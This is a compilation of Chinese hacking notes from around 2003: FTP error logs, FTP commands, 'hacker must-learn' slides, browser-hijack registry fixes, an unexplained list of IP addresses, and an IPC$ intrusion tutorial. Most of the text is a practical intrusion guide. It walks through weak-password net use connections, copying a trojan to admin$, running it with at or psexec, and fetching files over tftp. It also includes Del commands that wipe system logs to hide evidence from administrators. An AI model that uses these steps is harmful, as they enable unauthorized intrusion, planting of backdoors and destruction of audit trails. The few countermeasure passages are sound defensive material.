Sat Feb 15 00:13:02 2003 正在连接 61.143.241.231 [IP=61.143.241.231:21] 
Sat Feb 15 00:13:02 2003 Socket已连接 ,等待欢迎资讯 
Sat Feb 15 00:13:03 2003 220 http://www.starwcn.net ;free Ftp Server 231 
Sat Feb 15 00:13:03 2003 USER ftper 
Sat Feb 15 00:13:03 2003 331 Password required for ftper. 
Sat Feb 15 00:13:03 2003 PASS ******** 
Sat Feb 15 00:13:03 2003 530 Login incorrect. 
Sat Feb 15 00:13:03 2003 有错误发生! 
Sat Feb 15 00:13:03 2003 等待 10秒后重试 
这就是说明密码不正确。 

(三) 常见FTP登陆Log资讯 

1. 
Connected. Waiting for response. 
220 Serv-U FTP Server v4.0 for WinSock ready... 
USER anonymous 
530 Sorry, no ANONYMOUS access allowed. 
QUIT 
这个就是不许匿名登录啦 
2. 
Connected. Waiting for response. 
220 Serv-U FTP Server v4.0 for WinSock ready... 
USER test 
331 User name okay, need password. 
PASS xxxxxx 
530 Not logged in. 
QUIT 
一般是密码输入错误时出现的资讯，但对于Serv-U来说，如果没有这个帐号（test）存在，也会?生同样的出错资讯。 
3. 
Connecting to xxx.xxx.xxx.xxx, Port 21 (#1) 
ERROR: Connection timed out 
这个表明对方未开机，也可能是对方不在你能访问的范围内 
4. 
Connecting to xxx.xxx.xxx.xxx Port 21 (#1) 
ERROR: Connection refused 
这个一般表明对方已开机，但未开?FTP服务（没有开Serv-U） 
也可能?对方不提供在这个埠上的服务 
5. 
Connecting to xxx.xxx.xxx.xxx, Port 21 (#1) 
Connected. Waiting for response. 
Disconnected from server. 
Connection attempt failed. Waiting for retry... 
出现这个资讯实在是很倒楣，你极有可能被对方Ban了。 
过半小时后再试吧 
6. 
Connecting to xxx.xxx.xxx.xxx, Port 21 (#1) 
Connected. Waiting for response. 
USER XXX 
331 User name okay, need password 
PASS xxxxxx 
530 Not logged in, unauthorized IP address. 
QUIT 
这个有点麻烦，你的IP不在站长允许访问的IP范围内 
7. 
Connected. Waiting for response. 
220 Serv-U FTP Server v4.0 for WinSock ready... 
USER user 
421 Too many users - please try again later. 
哈哈，这个很常见吧，用户太多，稍后再试吧 
8. 
Connected. Waiting for response. 
220 Serv-U FTP Server v4.0 for WinSock ready... 
USER test 
530 Not logged in, only one session from same IP allowed at a time. 
QUIT 
每个IP只能开一个下载，就不要用多线程啦，小心Ban了你。 
9 
230 User logged in, proceed. 
状态:> 登录成功。 
命令:> PWD 
257 "/" is current directory. 
状态:> Home directory: / 
状态:> 该站点支援 features。 
状态:> 该站点支援 SIZE。 
状态:> 该站点可以续传中断的下载。 
命令:> REST 0 
350 Restarting at 0. Send STORE or RETRIEVE. 
命令:> PORT 10,7,72,20,5,71 
530 Only client IP address allowed for PORT command. 
错误:> 未登录。 
错误:> 建立资料 socket 失败。 
状态:> 连接已关闭。 
有些ftp要求使用post,一般默认pasv,这是应该使用pasv,错用post所致不能登陆 
 
 


【FTP命令】
FTP命令是Internet用户使用最频繁的命令之一，熟悉并灵活应用FTP的内部命令，可以大大方便使用者，并收到事半功倍之效。如果你想学习使用进行后台FTP下载，那么就必须学习FTP指令。

FTP的命令行格式为： 
ftp -v -d -i -n -g [主机名] ，其中

-v 显示远程服务器的所有响应信息；

-n 限制ftp的自动登录，即不使用；.n etrc文件；

-d 使用调试方式；

-g 取消全局文件名。


FTP使用的内部命令如下(中括号表示可选项):

1.![cmd[args]]：在本地机中执行交互shell，exit回到ftp环境，如：!ls*.zip

2.$ macro-ame[args]： 执行宏定义macro-name。

3.account[password]： 提供登录远程系统成功后访问系统资源所需的补充口令。

4.append local-file[remote-file]：将本地文件追加到远程系统主机，若未指定远程系统文件名，则使用本地文件名。

5.ascii：使用ascii类型传输方式。

6.bell：每个命令执行完毕后计算机响铃一次。

7.bin：使用二进制文件传输方式。

8.bye：退出ftp会话过程。

9.case：在使用mget时，将远程主机文件名中的大写转为小写字母。

10.cd remote-dir：进入远程主机目录。

11.cdup：进入远程主机目录的父目录。

12.chmod mode file-name：将远程主机文件file-name的存取方式设置为mode，如：chmod 777 a.out。

13.close：中断与远程服务器的ftp会话(与open对应)。

14.cr：使用asscii方式传输文件时，将回车换行转换为回行。

15.delete remote-file：删除远程主机文件。

16.debug[debug-value]：设置调试方式， 显示发送至远程主机的每条命令，如：deb up 3，若设为0，表示取消debug。

17.dir[remote-dir][local-file]：显示远程主机目录，并将结果存入本地文件

18.disconnection：同close。

19.form format：将文件传输方式设置为format，缺省为file方式。

20.get remote-file[local-file]： 将远程主机的文件remote-file传至本地硬盘的local-file。

21.glob：设置mdelete，mget，mput的文件名扩展，缺省时不扩展文件名，同命令行的-g参数。

22.hash：每传输1024字节，显示一个hash符号(#)。

23.help[cmd]：显示ftp内部命令cmd的帮助信息，如：help get。
24.idle[seconds]：将远程服务器的休眠计时器设为[seconds]秒。

25.image：设置二进制传输方式(同binary)。

26.lcd[dir]：将本地工作目录切换至dir。

27.ls[remote-dir][local-file]：显示远程目录remote-dir， 并存入本地文件local-file。

28.macdef macro-name：定义一个宏，遇到macdef下的空行时，宏定义结束。

29.mdelete[remote-file]：删除远程主机文件。

30.mdir remote-files local-file：与dir类似，但可指定多个远程文件，如 ：mdir *.o.*.zipoutfile 。

31.mget remote-files：传输多个远程文件。

32.mkdir dir-name：在远程主机中建一目录。

33.mls remote-file local-file：同nlist，但可指定多个文件名。

34.mode[modename]：将文件传输方式设置为modename， 缺省为stream方式。

35.modtime file-name：显示远程主机文件的最后修改时间。

36.mput local-file：将多个文件传输至远程主机。

37.newer file-name： 如果远程机中file-name的修改时间比本地硬盘同名文件的时间更近，则重传该文件。

38.nlist[remote-dir][local-file]：显示远程主机目录的文件清单，并存入本地硬盘的local-file。

39.nmap[inpattern outpattern]：设置文件名映射机制， 使得文件传输时，文件中的某些字符相互转换， 如：nmap $1.$2.$3[$1，$2].[$2，$3]，则传输文件a1.a2.a3时，文件名变为a1，a2。 该命令特别适用于远程主机为非UNIX机的情况。

40.ntrans[inchars[outchars]]：设置文件名字符的翻译机制，如ntrans1R，则文件名LLL将变为RRR。

41.open host[port]：建立指定ftp服务器连接，可指定连接端口。

42.passive：进入被动传输方式。

43.prompt：设置多个文件传输时的交互提示。

44.proxy ftp-cmd：在次要控制连接中，执行一条ftp命令， 该命令允许连接两个ftp服务器，以在两个服务器间传输文件。第一条ftp命令必须为open，以首先建立两个服务器间的连接。

45.put local-file[remote-file]：将本地文件local-file传送至远程主机。

46.pwd：显示远程主机的当前工作目录。

47.quit：同bye，退出ftp会话。

48.quote arg1，arg2...：将参数逐字发至远程ftp服务器，如：quote syst.
49.recv remote-file[local-file]：同get。

50.reget remote-file[local-file]：类似于get， 但若local-file存在，则从上次传输中断处续传。

51.rhelp[cmd-name]：请求获得远程主机的帮助。

52.rstatus[file-name]：若未指定文件名，则显示远程主机的状态， 否则显示文件状态。

53.rename[from][to]：更改远程主机文件名。

54.reset：清除回答队列。

55.restart marker：从指定的标志marker处，重新开始get或put，如：restart 130。

56.rmdir dir-name：删除远程主机目录。

57.runique：设置文件名只一性存储，若文件存在，则在原文件后加后缀.1， .2等。

58.send local-file[remote-file]：同put。

59.sendport：设置PORT命令的使用。

60.site arg1，arg2...：将参数作为SITE命令逐字发送至远程ftp主机。

61.size file-name：显示远程主机文件大小，如：site idle 7200。

62.status：显示当前ftp状态。

63.struct[struct-name]：将文件传输结构设置为struct-name， 缺省时使用stream结构。

64.sunique：将远程主机文件名存储设置为只一(与runique对应)。

65.system：显示远程主机的操作系统类型。

66.tenex：将文件传输类型设置为TENEX机的所需的类型。

67.tick：设置传输时的字节计数器。

68.trace：设置包跟踪。

69.type[type-name]：设置文件传输类型为type-name，缺省为ascii，如:type binary，设置二进制传输方式。

70.umask[newmask]：将远程服务器的缺省umask设置为newmask，如：umask 3

71.user user-name[password][account]：向远程主机表明自己的身份，需要口令时，必须输入口令，如：user anonymous my@email。

72.verbose：同命令行的-v参数，即设置详尽报告方式，ftp 服务器的所有响 应都将显示给用户，缺省为on.

73.?[cmd]：同help.





【hacker必学】
必须要掌握的几个命令
・Net
・netsh
・Ftp
・hostname
・Telenet(nc)
・tracert
・At
・Tftp
・Netstat
・Regedit
・Ping

必须要掌握的几个协议
・http
・dns
・ftp
・Pop
・Smtp


・Icmp
・Udp
・tcp

开始
・掌握了黑客攻击的方式和手段后,那么学习黑客就简单多了!
・因为你掌握了这些,剩余的就是使用工具入侵
・熟悉掌握一套自己用的黑客工具

高级
・自己编写专用的黑客工具
・自己发现系统漏洞

黑客入侵手段
・收集信息:
・   收集要入侵的目标信息
・   IP,域名,端口,漏洞,位置

弱口令
・在nt\2000\xp\2003中弱口令可以用
・Net use \ip “password” /user:user
・如果目标机开3389服务,可以直接连接


・在sql的sa弱口令,可以用sql连接器直接 ・登陆

后门木马
・如果有ipc$共享,可以copy过去木马后门
・用at启动
・AT \ip time /INTERACTIVE
・如果可以得到shell,也可以用tftp
・Tftp.exe ?Ci ip get *.* *.*
・然后直接安装 ・如果有3389,可以自己建一个iis,下载 直接运行

密码破解
・远程破解mysql,mssql,ftp,mail,共享密码
・本地破解管理员(administrator)密码

缓冲溢出
・可以用缓冲溢出攻击,
・比如流行的webdev,rdcom模块漏洞
・可以直接得到system管理权限
・缓冲溢出后的一般现象是:
・Microsoft Windows 2000 [Version 5.00.2195]
  (C) Copyright 1985-2000 Microsoft Corp.
  C:\WINNT\system32>

 

Web服务漏洞
・例如:
・Unicode漏洞遍历磁盘和执行程序
・二次编码漏洞遍历磁盘和执行程序
・.HTR漏洞查看源代码

嗅探监听
・例如:
・针对web监听
・针对mail监听
・工具如:sinffer , iris

欺骗攻击
・例如:
・运用arp欺骗攻击

伪装欺骗
・常见的如:mail病毒
・把一个文件改名字甚至图标,欺骗对方执行

社会工程学


・例如:
・QQ聊天诱惑
・EMAIL信息
・电话
・诱惑

拒绝服务
・例如:
・Dos攻击
・Ddos攻击

利用跳板
・利用自己的肉鸡作为跳板攻击别的机器
・My PC------>跳板(肉鸡)--->目标

路由器漏洞
・如:
・原始密码
・程序漏洞

防火墙
・利用欺骗攻击防火墙,导致防火墙功能失效


・利用防火墙的模块漏洞

unix/linux
・NetWare Linux unix solais Solaris hp-unix Aix 等
・这些目前先不讲解

精通黑客工具
・必须有一套自己可以完全掌握的黑客工具
・如端口扫描 Nscan,bluescanport
・监听工具:sinffer iris
・telnet工具:nc
・扫描工具:sss,nmap, LANguard
・后门工具:radmin,winshell
・密码破解:lc4
・远程管理:pcanywhere
・会使用各种经典的黑客工具

清除日志
・在你入侵机器以后,离开的时候,要完全清除
・自己在那台机器上留下的痕迹
・例如清除
・Del C:\WINNT\system32\LogFiles\*.*


・Del C:\WINNT\system32\*.log
・Del C:\WINNT\system32\*.txt
・Del C:\WINNT\*.log
・Del c:\winnt\*.txt

如果你不清除日志
・当目标机器的管理员发现你的证据
・完全可以让你在大墙内渡过一段日子

黑客
・当你完全掌握这些后
・你就成为了一名小黑客

高级
・编写自己的黑客工具
・发现系统漏洞

高级黑客
・目前你足以成为一个高级黑客了

真正的黑客
・精通各种网络协议


・精通操作系统
・精通编程技术
・精通安全防护
・不搞破坏
・挑战技术难题

结束
・想学好这些,并不是靠别人给你的,而是靠自己的努力,自己的自学得到的!
・别人只能指导你,怎么去做,只能告诉方法,
・真正的实施是你自己,经过N*N个日夜努力换来的
・不要一个问题问多次,要多动手,动脑!
・Google里面有太多的答案,为什么我搜索不到?因为你的关键字用的不对!
・黑客基地是为了培养出一批优秀的网络人才,让更多想学习网络的爱好者有一个理想的学
习环境
・这三篇幻灯片是我们多年的经验得到的!
・很有价值,望好好保存!仔细研究!



【IE与注册表解决方法】
一、IE标题栏被修改 
请打开你的注册表工具（在运行菜单中输入regedit，不能用regedit者见后） 
查找: 

HKEY_LOCAL_MACHINE\Software\Microsoft\Internet Explorer\Main 
HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main 
这两个地方，将其中的Windows Title主键删除 
然后重新启动你的IE 

二、首页被修改（Homepage） 
这个是最简单的，在IE的设置中就可以改回来 

三、在windows启动时弹出一个窗口，点确定才能进去 
在注册表中查找： 
HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Winlogon 
删除其中的LegalNoticeCaption和LegalNoticeText主键 

四、IE中点击鼠标右键菜单中插入的广告 
在注册表中查找 
HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\MenuExt 
找到相关的条目删除即可 

五、综合解决 
可建立一个.reg的文件，其内容如下： 
REGEDIT4 
[HKEY_LOCAL_MACHINE\Software\Microsoft\Internet Explorer\Main] 
"Window Title"="Microsoft Internet Explorer" 
"Start Page"="about:blank" 
[HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main] 
"Window Title"="Microsoft Internet Explorer" 
[HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Winlogon] 
"LegalNoticeCaption"="" 
"LegalNoticeText"="" 

当你发现前三项被修改时，执行一次这个.reg后缀的文件就可以了 

六、当你的主页被修改而且关于主页的三个按钮“使用当前页”、 
“使用默认页”、“使用空白页”也变成灰色，不能修改。 
建立一个.reg文件，内容如下： 
REGEDIT4 

[HKEY_CURRENT_USER\Software\Policies\Microsoft\Internet Explorer\Control Panel] 
"HomePage"=dword:00000000 

[HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main] 
"Start Page"="about:blank" 
"Window Title"="Microsoft Internet Explorer" 

[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Internet Explorer\Main] 
"Start Page"="about:blank" 
"Window Title"="Microsoft Internet Explorer" 

然后保存并双击导入即可 

七、注册表被禁用 
那您真是背到家了，呵呵 
把这段内容保存成.reg结尾的文件，双击执行吧 
REGEDIT4 

[HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System] 

"DisableRegistryTools"=dword:00000000 

八、不懂注册表为何物？ 
请到www.coolstarpage.com/unreg去恢复吧 
或者使用magicset或者到 
http://www.soft999.com/download1/IESetup.exe 
下载ie反修改精灵 

九、Windows2000用户的防范 
请打开管理工具/服务，禁用Remote Registry Service服务，使他人无法修改你的 
注册表内容 

十、终极办法! 
将你的IE升级到IE5.5 sp2或者IE6 
将你的W2k升级到sp2 
您将不会遇到这类问题 
当然最好你再装上专门的防毒或者防火墙软件 
或者再把你的IE安全设置中脚本执行设置为提示 


【ip】
211.64.192.235
211.64.192.69
211.64.206.17
211.64.206.213
211.64.192.191
211.64.207.144
211.64.192.252
211.64.201.147
211.64.207.101
211.64.199.40
211.64.199.119
211.64.207.43
211.64.194.35
211.64.201.222
211.64.193.137
211.64.194.116
211.64.194.54
211.64.201.35
211.64.201.10
211.64.194.99
211.64.206.213
211.64.207.43

【ipc$共享入侵】
ipc$共享入侵 

微软在win2000，xp中设置的这个功能对个人用户来说几乎毫无用处。反而成了黑客入侵nt架构操作系统的一条便利通道。如果你的操作系统存在不安全的口令，那就更可怕了。一条典型的入侵流程如下： 

（1）用任何办法得到一个帐户与口令（猜测，破解），网上流传有一个叫做smbcrack的软件就是利用ipc$来破解帐户口令的。如果你的密码位数不高，又很简单，是很容易被破解的。根据我的个人经验，相当多的人都将administrator的口令设为123，2003，或者干脆不设密码。 

（2）使用命令net use \\xxx.xxx.xxx.xxx\ipc$“密码” /user:“用户名”建立一个有一定权限的ipc$连接。用copy trojan.exe \\xxx.xxx.xxx.xxx\admin$ 将木马程序的服务器端复制到系统目录下。

（3）用net time \\xxx.xxx.xxx.xxx 命令查看对方操作系统的时间，然后用at \\202.xxx.xxx.xxx 12：00 trojan.exe 让trojan.exe在指定时间运行。 

这样一来，你的电脑就完全被黑客控制了。 

应对措施：禁用server服务, Task Scheduler服务，去掉网络文件和打印机共享前的对勾(插入图1)， 

当然，给自己的帐户加上强壮的口令才是最关键的。 



【IPC$命令】
IPC$命令
一 摘要
二 什么是ipc$
三 什么是空会话
四 空会话可以做什么
五 ipc$所使用的端口
六 ipc管道在hack攻击中的意义
七 ipc$连接失败的常见原因
八 复制文件失败的原因
九 关于at命令和xp对ipc$的限制
十 如何打开目标的IPC$共享以及其他共享
十一 一些需要shell才能完成的命令
十二 入侵中可能会用到的命令
十三 对比过去和现今的ipc$入侵
十四 如何防范ipc$入侵
十五 ipc$入侵问答精选

一 摘要
注意：本文所讨论的各种情况均默认发生在win NT/2000环境下，win98将不在此次讨论之列。


二 什么是ipc$
IPC$(Internet Process Connection)是共享"命名管道"的资源，它是为了让进程间通信而开放的命名管道，通过提供可信任的用户名和口令，连接双方可以建立安全的通道并以此通道进行加密数据的交换，从而实现对远程计算机的访问。IPC$是NT/2000的一项新功能，它有一个特点，即在同一时间内，两个IP之间只允许建立一个连接。NT/2000在提供了ipc$功能的同时，在初次安装系统时还打开了默认共享，即所有的逻辑共享(c$,d$,e$……)和系统目录winnt或windows(admin$)共享。所有的这些，微软的初衷都是为了方便管理员的管理，但在有意无意中，导致了系统安全性的降低。
平时我们总能听到有人在说ipc$漏洞，ipc$漏洞，其实ipc$并不是一个真正意义上的漏洞,我想之所以有人这么说，一定是指微软自己安置的那个‘后门’：空会话（Null session）。那么什么是空会话呢？


三 什么是空会话
在介绍空会话之前，我们有必要了解一下一个安全会话是如何建立的。
在Windows NT 4.0中是使用挑战响应协议与远程机器建立一个会话的，建立成功的会话将成为一个安全隧道，建立双方通过它互通信息，这个过程的大致顺序如下： 
1）会话请求者（客户）向会话接收者（服务器）传送一个数据包，请求安全隧道的建 
立； 
2）服务器产生一个随机的64位数（实现挑战）传送回客户； 
3）客户取得这个由服务器产生的64位数，用试图建立会话的帐号的口令打乱它，将结 
果返回到服务器（实现响应）； 
4）服务器接受响应后发送给本地安全验证（LSA），LSA通过使用该用户正确的口令来核实响应以便确认请求者身份。如果请求者的帐号是服务器的本地帐号，核实本地发生；如果请求的帐号是一个域的帐号，响应传送到域控制器去核实。当对挑战的响应核实为正确后，一个访问令牌产生，然后传送给客户。客户使用这个访问令牌连接到服务器上的资源直到建议的会话被终止。
以上是一个安全会话建立的大致过程，那么空会话又如何呢？

空会话是在没有信任的情况下与服务器建立的会话（即未提供用户名与密码），但根据WIN2000的访问控制模型，空会话的建立同样需要提供一个令牌，可是空会话在建立过程中并没有经过用户信息的认证，所以这个令牌中不包含用户信息，因此，这个会话不能让系统间发送加密信息，但这并不表示空会话的令牌中不包含安全标识符SID（它标识了用户和所属组），对于一个空会话，LSA提供的令牌的SID是S-1-5-7，这就是空会话的SID，用户名是：ANONYMOUS LOGON（这个用户名是可以在用户列表中看到的，但是是不能在SAM数据库中找到，属于系统内置的帐号），这个访问令牌包含下面伪装的组： 
Everyone 
Network
在安全策略的限制下，这个空会话将被授权访问到上面两个组有权访问到的一切信息。那么建立空会话到底可以作什么呢？ 


四 空会话可以做什么 
对于NT，在默认安全设置下，借助空连接可以列举目标主机上的用户和共享，访问everyone权限的共享，访问小部分注册表等，并没有什么太大的利用价值；对2000作用更小，因为在Windows 2000 和以后版本中默认只有管理员和备份操作员有权从网络访问到注册表，而且实现起来也不方便，需借助工具。
从这些我们可以看到，这种非信任会话并没有多大的用处，但从一次完整的ipc$入侵来看，空会话是一个不可缺少的跳板，因为我们从它那里可以得到户列表，而大多数弱口令扫描工具就是利用这个用户列表来进行口令猜解的，成功的导出用户列表大大增加了猜解的成功率，仅从这一点，足以说明空会话所带来的安全隐患，因此说空会话毫无用处的说法是不正确的。以下是空会话中能够使用的一些具体命令：


1 首先，我们先建立一个空连接（当然，这需要目标开放ipc$）
命令：net use \\ip\ipc$ "" /user:""
注意：上面的命令包括四个空格，net与use中间有一个空格，use后面一个，密码左右各一个空格。


2 查看远程主机的共享资源
命令：net view \\ip
解释：前提是建立了空连接后，用此命令可以查看远程主机的共享资源，如果它开了共享，可以得到如下面的结果，但此命令不能显示默认共享。

在 \\*.*.*.*的共享资源
资源共享名 类型 用途 注释

-----------------------------------------------------------
NETLOGON Disk Logon server share
SYSVOL Disk Logon server share
命令成功完成。

3 查看远程主机的当前时间
命令： net time \\ip
解释：用此命令可以得到一个远程主机的当前时间。


4 得到远程主机的NetBIOS用户名列表（需要打开自己的NBT）
命令：nbtstat -A ip
用此命令可以得到一个远程主机的NetBIOS用户名列表，返回如下结果：

Node IpAddress: [*.*.*.*] Scope Id: []

NetBIOS Remote Machine Name Table

Name Type Status
---------------------------------------------
SERVER <00> UNIQUE Registered
OYAMANISHI-H <00> GROUP Registered
OYAMANISHI-H <1C> GROUP Registered
SERVER <20> UNIQUE Registered
OYAMANISHI-H <1B> UNIQUE Registered
OYAMANISHI-H <1E> GROUP Registered
SERVER <03> UNIQUE Registered
OYAMANISHI-H <1D> UNIQUE Registered
..__MSBROWSE__.<01> GROUP Registered
INet~Services <1C> GROUP Registered
IS~SERVER......<00> UNIQUE Registered

MAC Address = 00-50-8B-9A-2D-37


以上就是我们经常使用空会话做的事情，好像也能获得不少东西哟，不过要注意一点：建立IPC$连接的操作会在Event Log中留下记录，不管你是否登录成功。 好了，那么下面我们就来看看ipc$所使用的端口是什么？


五 ipc$所使用的端口
首先我们来了解一些基础知识：
1 SMB:(Server Message Block) Windows协议族，用于文件打印共享的服务；
2 NBT:(NETBios Over TCP/IP)使用137（UDP）138（UDP）139（TCP）端口实现基于TCP/IP协议的NETBIOS网络互联。
3 在WindowsNT中SMB基于NBT实现，即使用139（TCP）端口；而在Windows2000中，SMB除了基于NBT实现，还可以直接通过445端口实现。

有了这些基础知识，我们就可以进一步来讨论访问网络共享对端口的选择了：

对于win2000客户端（发起端）来说：
1 如果在允许NBT的情况下连接服务器时，客户端会同时尝试访问139和445端口，如果445端口有响应，那么就发送RST包给139端口断开连接，用455端口进行会话，当445端口无响应时，才使用139端口，如果两个端口都没有响应，则会话失败；
2 如果在禁止NBT的情况下连接服务器时，那么客户端只会尝试访问445端口，如果445端口无响应，那么会话失败。


对于win2000服务器端来说：
1 如果允许NBT, 那么UDP端口137, 138, TCP 端口 139, 445将开放（LISTENING）；
2 如果禁止NBT，那么只有445端口开放。


我们建立的ipc$会话对端口的选择同样遵守以上原则。显而易见，如果远程服务器没有监听139或445端口，ipc$会话是无法建立的。


六 ipc管道在hack攻击中的意义
ipc管道本来是微软为了方便管理员进行远程管理而设计的，但在入侵者看来，开放ipc管道的主机似乎更容易得手。通过ipc管道，我们可以远程调用一些系统函数（大多通过工具实现，但需要相应的权限），这往往是入侵成败的关键。如果不考虑这些，仅从传送文件这一方面，ipc管道已经给了入侵者莫大的支持，甚至已经成为了最重要的传输手段，因此你总能在各大论坛上看到一些朋友因为打不开目标机器的ipc管道而一筹莫展大呼救命。当然，我们也不能忽视权限在ipc管道中扮演的重要角色，想必你一定品尝过空会话的尴尬，没有权限，开启管道我们也无可奈何。但入侵者一旦获得了管理员的权限，那么ipc管道这把双刃剑将显示出它狰狞的一面。


七 ipc$连接失败的常见原因
以下是一些常见的导致ipc$连接失败的原因：

1 IPC连接是Windows NT及以上系统中特有的功能，由于其需要用到Windows NT中很多DLL函数，所以不能在Windows 9.x/Me系统中运行，也就是说只有nt/2000/xp才可以相互建立ipc$连接，98/me是不能建立ipc$连接的；


2 如果想成功的建立一个ipc$连接，就需要响应方开启ipc$共享，即使是空连接也是这样，如果响应方关闭了ipc$共享，将不能建立连接；


3 连接发起方未启动Lanmanworkstation服务（显示名为：Workstation）：它提供网络链结和通讯，没有它发起方无法发起连接请求；


4 响应方未启动Lanmanserver服务（显示名为：Server）：它提供了 RPC 支持、文件、打印以及命名管道共享，ipc$依赖于此服务，没有它主机将无法响应发起方的连接请求，不过没有它仍可发起ipc$连接；


5 响应方未启动NetLogon，它支持网络上计算机 pass-through 帐户登录身份（不过这种情况好像不多）；


6 响应方的139，445端口未处于监听状态或被防火墙屏蔽；


7 连接发起方未打开139，445端口；


8 用户名或者密码错误：如果发生这样的错误，系统将给你类似于'无法更新密码'这样的错误提示（显然空会话排除这种错误）；


9 命令输入错误：可能多了或少了空格，当用户名和密码中不包含空格时两边的双引号可以省略，如果密码为空，可以直接输入两个引号""即可；


10 如果在已经建立好连接的情况下对方重启计算机，那么ipc$连接将会自动断开，需要重新建立连接。 


另外,你也可以根据返回的错误号分析原因： 

错误号5，拒绝访问：很可能你使用的用户不是管理员权限的； 
错误号51，Windows无法找到网络路径：网络有问题； 
错误号53，找不到网络路径：ip地址错误；目标未开机；目标lanmanserver服务未启动；目标有防火墙（端口过滤）； 
错误号67，找不到网络名：你的lanmanworkstation服务未启动或者目标删除了ipc$； 
错误号1219，提供的凭据与已存在的凭据集冲突：你已经和对方建立了一个ipc$，请删除再连； 
错误号1326，未知的用户名或错误密码：原因很明显了； 
错误号1792，试图登录，但是网络登录服务没有启动：目标NetLogon服务未启动；
错误号2242，此用户的密码已经过期：目标有帐号策略，强制定期要求更改密码。 


八 复制文件失败的原因
有些朋友虽然成功的建立了ipc$连接，但在copy时却遇到了这样那样的麻烦，无法复制成功，那么导致复制失败的常见原因又有哪些呢？


1 对方未开启共享文件夹
这类错误出现的最多，占到50%以上。许多朋友在ipc$连接建立成功后，甚至都不知道对方是否有共享文件夹，就进行盲目复制，结果导致复制失败而且郁闷的很。因此我建议大家在进行复制之前务必用net view \\IP这个命令看一下你想要复制的共享文件夹是否存在（用软件查看当然更好），不要认为能建立ipc$连接就一定有共享文件夹存在。


2 向默认共享复制失败
这类错误也是大家经常犯的，主要有两个小方面：

1）错误的认为能建立ipc$连接的主机就一定开启了默认共享，因而在建立完连接之后马上向c$,d$,admin$之类的默认共享复制文件，一旦对方未开启默认共享，将导致复制失败。ipc$连接成功只能说明对方打开了ipc$共享，并不能说明默认共享一定存在。ipc$共享与默认共享是两码事，ipc$共享是一个命名管道，并不是哪个实际的文件夹，而默认共享却是实实在在的共享文件夹；

2）由于net view \\IP 这个命令无法显示默认共享文件夹（因为默认共享带$），因此通过这个命令，我们并不能判断对方是否开启了默认共享，因此如果对方未开启默认共享，那么所有向默认共享进行的操作都不能成功；（不过大部分扫描软件在扫弱口令的同时，都能扫到默认共享目录，可以避免此类错误的发生）

要点：请大家一定区分ipc共享，默认共享，普通共享这三者的区别：ipc共享是一个管道，并不是实际的共享文件夹；默认共享是安装时默认打开的文件夹；普通共享是我们自己开启的可以设置权限的共享文件夹。


3用户权限不够，包括四种情形：
1）空连接向所有共享（默认共享和普通共享）复制时，权限是不够的；
2）向默认共享复制时，在Win2000 Pro版中，只有Administrators和Backup Operators组成员才可以，在Win2000 Server版本 Server Operatros组也可以访问到这些共享目录； 
3）向普通共享复制时，要具有相应权限（即对方管理员事先设定的访问权限）；
4）对方可以通过防火墙或安全软件的设置，禁止外部访问共享；

注意：
1 不要认为administrator就一定具有管理员权限，管理员名称是可以改的
2 管理员可以访问默认共享的文件夹，但不一定能够访问普通的共享文件夹，因为管理员可以对普通的共享文件夹进行访问权限设置，如图6，管理员为D盘设置的访问权限为仅允许名为xinxin的用户对该文件夹进行完全访问，那么此时即使你拥有管理员权限，你仍然不能访问D盘。不过有意思的是，如果此时对方又开启了D$的默认共享，那么你却可以访问D$，从而绕过了权限限制，有兴趣的朋友可以自己做测试。


4被防火墙杀死或在局域网
还有一种情况，那就是也许你的复制操作已经成功，但当远程运行时，被防火墙杀掉了，导致找不到文件；或者你把木马复制到了局域网内的主机，导致连接失败（反向连接的木马不会发生这种情况）。如果你没有想到这种情况，你会以为是复制上出了问题，但实际你的复制操作已经成功了，只是运行时出了问题。


呵呵，大家也知道，ipc$连接在实际操作过程中会出现各种各样的问题，上面我所总结的只是一些常见错误，没说到的，大家可以给我提个醒儿。


九 关于at命令和xp对ipc$的限制
本来还想说一下用at远程运行程序失败的原因，但考虑到at的成功率不是很高，问题也很多，在这里就不提它了（提的越多，用的人就越多），而是推荐大家用psexec.exe远程运行程序，假设想要远程机器执行本地c:\xinxin.exe文件，且管理员为administrator，密码为1234，那么输入下面的命令：
psexec \\ip -u administrator -p 1234 -c c:\xinxin.exe
如果已经建立ipc连接，则-u -p这两个参数不需要，psexec.exe将自动拷贝文件到远程机器并运行。

本来xp中的ipc$也不想在这里讨论，想单独拿出来讨论，但看到越来越多的朋友很急切的提问为什么遇到xp的时候，大部分操作都很难成功。我在这里就简单提一下吧，在xp的默认安全选项中，任何远程访问仅被赋予来宾权限，也就是说即使你是用管理员帐户和密码，你所得到的权限也只是Guest，因此大部分操作都会因为权限不够而失败，而且到目前为止并没有一个好的办法来突破这一限制。所以如果你真的得到了xp的管理员密码，我建议你尽量避开ipc管道。


十 如何打开目标的IPC$共享以及其他共享
目标的ipc$不是轻易就能打开的，否则就要天下打乱了。你需要一个admin权限的shell，比如telnet，木马，cmd重定向等，然后在shell下执行：
net share ipc$
开放目标的ipc$共享；
net share ipc$ /del
关闭目标的ipc$共享；如果你要给它开共享文件夹，你可以用：
net share xinxin=c:\
这样就把它的c盘开为共享名为xinxin共享


【IPC$问答】
1，怎样建立空连接，它有什么用？ 
答：使用命令 net use \\IP\ipc$ "" /user:"" 就可以简单地和目标建立一个空连接（需要目标开放ipc$）。 
对于NT，在默认安全设置下，借助空连接可以列举目标用户、共享，访问everyone权限的共享，访问小部分注册表等，没有什么利用价值。对2000作用就更小了。而且实现也不方便，需借助工具。如果你不理解“没用”的东西为什么还会存在，就看看“专业”的解释吧： 
在NT/2000下的空连接 http://www.3389.net/bbs/dispbbs.asp?boardID=22&RootID=3424&ID=3424&page=1： 
解剖WIN2K下的空会话 http://www.sandflee.net/txt/list.asp?id=117 ; 
2，为什么我连不上IPC$？ 
答：1，只有nt/2000/xp及以上系统才可以建立ipc$。如果你用的是98/me是没有该功能的。 
2，确认你的命令没有打错。正确的命令是： net use \\目标IP\ipc$ "密码" /user:"用户名" 
注意别多了或少了空格。当用户名和密码中不包含空格时两边的双引号可以省略。空密码用""表示。 
